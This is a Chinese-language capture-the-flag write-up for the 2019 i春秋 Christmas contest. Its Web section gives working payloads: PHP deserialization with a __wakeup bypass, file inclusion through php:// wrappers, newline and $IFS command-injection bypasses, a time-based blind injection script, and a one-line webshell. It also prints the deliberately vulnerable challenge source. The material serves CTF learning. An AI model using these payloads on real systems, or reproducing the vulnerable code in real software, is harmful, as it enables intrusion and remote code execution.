# i春秋 欢乐圣诞赛

## 比赛信息

> 项目名称：CTF答题夺旗赛（第四季）
> 项目期限：2019.12.24 10:00:00-2019.12.28 23:59:59
> 每日10:00更新题目

## Writeup

> https://www.jianshu.com/p/97ca00e255a7
>
> http://pumpkin9.top/2019/12/24/%E7%AC%AC%E5%9B%9B%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/
>
> http://reb0rn.design/2019/12/26/i%E6%98%A5%E7%A7%8B%E7%BD%91%E7%BB%9C%E5%86%85%E7%94%9F%E5%AE%89%E5%85%A8%E8%AF%95%E9%AA%8C%E5%9C%BACTF%E5%A4%BA%E6%97%97%E8%B5%9B-%E7%AC%AC%E5%9B%9B%E5%AD%A3-%E9%83%A8%E5%88%86wp/

## 题目信息

### Web

#### nani(200)
> http://120.55.43.255:24719/

查看网页源码
```html
<html>
    <title>Where</title>
    
<a href="./index.php?file=show.php"></a></html>
```
打开a标签跳转的连接，返回“user.php”。由连接参数file测试文件包含，使用“/index.php?file=php://filter/read=convert.base64-encode/resource=index.php”分别得到index.php、show.php、user.php源码如下
```php
# index.php
<html>
    <title>Where</title>
    
<?php
    error_reporting(0);
    if(!$_GET[file]){echo '<a href="./index.php?file=show.php"></a>';}
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file,"tp")||stristr($file,"input")||stristr($file,"data")){
        echo "NANI?";
        exit();
    }
    include($file);
?>
</html>
```
```php
# show.php
<?php
	echo "user.php";
```
```php
# user.php
<?php
class convent{
	var $warn = "No hacker.";
	function __destruct(){
		eval($this->warn);
	}
	function __wakeup(){
		foreach(get_object_vars($this) as $k => $v) {
			$this->$k = null;
		}
	}
}
$cmd = $_POST[cmd];
unserialize($cmd);
?>
```
由user.php可知，本题是php反序列化绕过__wakeup然后命令执行。构造playload“cmd=O:7:"convent":2:{s:4:"warn";s:13:"system('ls');";}”post到user.php得到web根目录下所有文件
```
dsuhhjfdgjhaskjdkj.txt
index.php
show.php
user.php
```
访问“dsuhhjfdgjhaskjdkj.txt”得到flag
```
flag{qishinizhixuyaocaidaozhegewenjiandemingzijiuxingle}
```

#### random(200)
> http://120.55.43.255:27189

打开题目连接得到网页源码
```php
 <?php
    show_source(__FILE__);
    include "flag.php";
    $a = @$_REQUEST['hello'];
    $seed = @$_REQUEST['seed'];
    $key = @$_REQUEST['key'];
    
    mt_srand($seed);
    $true_key = mt_rand();
    if ($key == $true_key){
        echo "Key Confirm";
    }
    else{
        die("Key Error");
    }
    eval( "var_dump($a);");
?>
```
预测随机数然后代码执行，“/?seed=1&key=1244335972&hello=file("flag.php")”得到flag
```
flag{Y0u_Solv3_s4mpl3...oNc3_Mor3}
```

#### admin(200)
> http://120.55.43.255:28119

查看网页源码
```html
you are not admin ! <br/>hava a rest and then change your choose. 
<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
 
if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
 -->
```
user参数使用php://input绕过，body填写admin。然后file参数文件包含，“php://filter/read=convert.base64-encode/resource=class.php”得到网页源码
```php
# index.php
<?php
error_reporting(E_ALL & ~E_NOTICE);
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
 
if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    if(preg_match("/fffffflag/",$file)){
        exit();
    }else{
        include($file); //class.php
        $pass = unserialize($pass);
        echo $pass;
    }
}else{
    echo "you are not admin ! ";
    echo "<br/>";
    echo "hava a rest and then change your choose.";
}
 
?>
 
<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
 
if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
 -->
```
```php
# class.php
<?php
error_reporting(E_ALL & ~E_NOTICE);
 
class Read{//fffffflag.php
    public $file;
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);    
        }
        return "Awwwwwwwwwww man";
    }
}
?>
```
由index.php得知通过file参数包含class.php，pass参数反序列化从fffffflag.php读取flag，访问“/?user=php://input&pass=O:4:"Read":1:{s:4:"file";s:13:"fffffflag.php";}&file=class.php”得到fffffflag.php源码
```php
<?php
error_reporting(E_ALL & ~E_NOTICE);
//flag{woyebuzhidaoyaononggeshaflagheshia}
?>
```
flag就是
```
flag{woyebuzhidaoyaononggeshaflagheshia}
```


#### ping(300)
> http://120.55.43.255:21173

查看网页源码
```html
There is a ping.php
<!--
    $password="****************";
     if(isset($_POST['password'])){
        if (strcmp($_POST['password'], $password) == 0) {
            echo "Right!!!login success";
            include($_REQUEST['path']);
            exit();
        } else {
            echo "Wrong password..";
        }
-->
```
password参数使用数组绕过，path参数通过“php://filter/read=convert.base64-encode/resource=”读取网页源码如下
```php
# index.php
<?php
    echo "There is a ping.php";
    $password="ACmvXfSFUayohrLB";
    if(isset($_POST['password'])){
        if (strcmp($_POST['password'],$password) == 0) {
            echo "Right!!!login success";
            include($_REQUEST['path']);
            exit();
        }
        else{
            echo "Wrong password..";
        }
    }
?>

<!--
    $password="****************";
     if(isset($_POST['password'])){
        if (strcmp($_POST['password'], $password) == 0) {
            echo "Right!!!login success";
            include($_REQUEST['path']);
            exit();
        } else {
            echo "Wrong password..";
        }
-->
```
```php
# ping.php
<?php
if(isset($_REQUEST[ 'ip' ])) {
    $target = trim($_REQUEST[ 'ip' ]);
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '|' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    $cmd = shell_exec( 'ping  -c 4 ' . $target );
        echo $target;
    echo  "<pre>{$cmd}</pre>";
}
```
ping.php的ip参数使用%0a作命令分隔符可以执行任意命令，访问“/ping.php?ip=1%0als”得到
```
PING 1 (0.0.0.1): 56 data bytes
ffffff1111aagggg.txt
index.php
ping.php
```
访问“ffffff1111aagggg.txt”得到flag
```
flag{You_AR3_qiao_bi_KuN???}
```


#### post1(300)
> http://120.55.43.255:20133

查看网页源码
```html
POST[a] 这次我们玩过滤好了。
<!--
	eval(system($c));//read flag.txt But no cat!！！
-->
```

命令执行绕过读取文件内容，常用的命令有cat,tac,less,more,head,tail,nl,tailf,od,cut......。经过测试只有cut没被过滤，其他都返回“没抓到重点”，包含空格时返回“危险”，用“$IFS$9”替换空格。post参数“a=cut$IFS$9-b$IFS$9-100$IFS$9flag.txt”得到flag
```
flag{WOw_Cut_4Nd_C4t_lo0kS_Sh49e}
```
同理可得到index.php源码
```php
<?php
	echo "POST[a] 这次我们玩过滤好了。";
	$b = $_POST['a'];
	if (strpos($b,'cut') === false && isset($b)){
		die("没抓到重点");
	}
	if (strpos($b,' ') !== false){
		die("危险");
	}
	if (strpos($b,'|') !== false){
		die("危险");
	}
	if (strpos($b,'&') !== false){
		die("危险");
	}
	if (strpos($b,';') !== false){
		die("危险");
	}
	if (strpos($b,'>') !== false){
		die("危险");
	}
	if (strpos($b,'<') !== false){
		die("危险");
	}
	if (strpos($b,'/') !== false){
		die("危险");
	}
	if (strpos($b,'ls') !== false){
		die("你挺能绕的...但不是这个意思啊...");
	}
	if (strpos($b,'cat') !== false){
		die("你挺能绕的...但不是这个意思啊...");
	}
	if (strpos($b,'rm') !== false){
		die("你挺能绕的...但不是这个意思啊...");
	}
	if (strpos($b,'whoami') !== false){
		die("你挺能绕的...但不是这个意思啊...");
	}
	if (strpos($b,'mv') !== false){
		die("你挺能绕的...但不是这个意思啊...");
	}
	if (strpos($b,'id') !== false){
		die("你挺能绕的...但不是这个意思啊...");
	}
	$c = str_replace("flag.txt","pNHYVfirTGWAIygv.txt",$b);
	eval(system($c));
?>

<!--
	eval(system($c));//read flag.txt But no cat!！！
-->
```
flag在web根目录的pNHYVfirTGWAIygv.txt文件中，直接访问也可以得到flag

#### post2(400)
> http://120.55.43.255:22712

查看网页源码
```html
POST[cmd] 这次我们玩过滤好了。
<!--
	eval(exec($c));//read flag.txt But no cat!！！
-->
```
同上一题post1，使用cut命令，区别在于exec执行命令后没有回显，空格没有过滤。本题正解是通过sleep命令盲注，构造的playload为（中括号相邻必须有空格）
```bash
[ `cut -b 2 flag.txt` == 'l' ] && sleep 1
```
盲注脚本参考
```python
# http://pumpkin9.top/2019/12/24/%E7%AC%AC%E5%9B%9B%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/
import requests
import string
dic = string.printable
flag = ""
for j in range(1,33):
	for i in range(len(dic)):
		url = "http://120.55.43.255:22712"
		data = {
			"cmd" : '''[ `cut -c '''+str(j)+''' flag.txt` =  "%c" ]  && sleep 5'''%dic[i]
		}
		try:
			r = requests.post(url,data=data,timeout=1)
			# print data
		except requests.exceptions.ReadTimeout,e:
			flag += dic[i]
			print flag
			break



import requests
import time

url = 'http://120.55.43.255:22712/'
alphabet = ['?','!','|','[',']','{','}','_','/','*','-','+','&',"%",'#','@','$','^','~','a','b','c','d','e','f','g','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']
flag = ''
count = 0
sign = 0

for i in range(50):
	count += 1
	payload = ''
	payload += 'a=`cut${IFS}-c${IFS}'
	payload += str(count)
	payload += '''${IFS}flag.txt`;${IFS}[${IFS}$a${IFS}=${IFS}"'''
	payload += '}'
	payload += '''"${IFS}]${IFS}&&${IFS}sleep${IFS}3'''
	data = {'cmd':payload}
	a = time.time()
	r = requests.post(url,data=data)
	b = time.time()
	if (b-a)>2 :
		print "Find."
		flaglen = count
		print count
		break
count = 0
for i in range(flaglen):
	count += 1
	sign = 0
	for letter in alphabet:
		payload = ''
		payload += 'a=`cut${IFS}-c${IFS}'
		payload += str(count)
		payload += '''${IFS}flag.txt`;${IFS}[${IFS}$a${IFS}=${IFS}"'''
		payload += letter
		payload += '''"${IFS}]${IFS}&&${IFS}sleep${IFS}3'''
		data = {'cmd':payload}
		a = time.time()
		r = requests.post(url,data=data)
		b = time.time()
		if (b-a)>2 :
			print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!YES!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
			flag+=letter
			sign = 1
			print flag
			break
	if sign == 0:
		print "@@@@@@@@@@@@@@@@@@@@@ERROR@@@@@@@@@@@@@@@@@@@@@@@@@@"

print flag

```

在做出post1的情况下这道题就剩各种骚套路了

```bash
# 非预期，flag文件没有改名，访问pNHYVfirTGWAIygv.txt直接得flag

# 可得index.php源码和任意命令执行（有回显）
cmd=echo 'show_source("index.php");system("l"."s");'#cut

# 直接getshell
cmd=echo 'eval($_POST["t"]);'#cut
t=phpinfo();
```

本题flag

```
flag{WOw_Cut_4Nd_C4t_lo0kS_S4m3}
```

本题源码

```php
<?php 
    echo "POST[cmd] 这次我们玩过滤好了。"; 
    $b = $_POST['cmd']; 
    if (strpos($b,'cut') === false && isset($b)){ 
        die("没抓到重点"); 
    } 
    if (strpos($b,'ls') !== false){ 
        die("你挺能绕的...但不是这个意思啊..."); 
    } 
    if (strpos($b,'cat') !== false){ 
        die("你挺能绕的...但不是这个意思啊..."); 
    } 
    if (strpos($b,'rm') !== false){ 
        die("你挺能绕的...但不是这个意思啊..."); 
    } 
    if (strpos($b,'whoami') !== false){ 
        die("你挺能绕的...但不是这个意思啊..."); 
    } 
    if (strpos($b,'mv') !== false){ 
        die("你挺能绕的...但不是这个意思啊..."); 
    } 
    if (strpos($b,'id') !== false){ 
        die("你挺能绕的...但不是这个意思啊..."); 
    } 
    if (strpos($b,'>') !== false){ 
        die("这你都能想到？我也想到了..."); 
    } 
    if (strpos($b,',') !== false){ 
        die("这你都能想到？我也想到了..."); 
    } 
    $c = str_replace("flag.txt","pNHYVfirTGWAIygv.txt",$b); 
    eval(exec($c)); 
?> 

<!-- 
    eval(exec($c));//read flag.txt But no cat!！！ 
-->
```

### Misc
#### XImg(100)

> http://120.55.43.255:34536/115FA9AF83B2997E/XImg.zip

附件下载：XImg.zip



#### pypi(300)

> http://120.55.43.255:34536/4FAFC54DC9DA59AA/pypi.zip

附件下载：pypi.zip




### Crypto
#### rsa(100)

> http://120.55.43.255:34536/12965DF2EFF34526/RSA.zip

附件下载：RSA.zip




### Reverse
#### apk123(100)

> http://120.55.43.255:34536/6996D737ABEAC38F/apk123.zip

附件下载：apk123.zip



#### basebasebase(300)

> http://120.55.43.255:34536/85B8BD5D90C76909/basebasebase.zip

附件下载：basebasebase.zip



#### babyre(400)

> http://120.55.43.255:34536/4FE0174862121EDE/babyre.zip

附件下载：babyre.zip



### Pwn
#### heap(300)
> nc: 120.55.43.255 12240
>
> http://120.55.43.255:34536/7008312E528E83BC/heap.zip

附件下载：heap.zip



#### Internal_Chat_System(400)
> nc 120.55.43.255 19812
>
> http://120.55.43.255:34536/4B5772C1972C4FD4/Internal_Chat_System.zip

附件下载：Internal_Chat_System.zip



#### Self-service Refueling System(200)
> nc: 120.55.43.255 23810
>
> http://120.55.43.255:34536/6F36F395999C40EB/service_Refueling_System.zip

附件下载：service_Refueling_System.zip


